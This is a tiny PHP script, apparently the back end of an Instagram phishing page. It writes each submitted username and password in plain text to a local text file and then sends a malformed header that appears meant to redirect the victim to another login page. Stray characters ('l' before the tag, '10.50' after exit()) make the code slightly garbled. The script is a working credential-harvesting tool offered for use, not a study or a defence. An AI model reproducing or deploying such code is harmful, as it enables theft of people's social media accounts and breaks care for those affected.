l<?php

file_put_contents("ilybicis.txt", "Instagram Username: " . $_POST['ilybicis'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('instagram: ilybicis./login2.html');
exit();10.50
?>
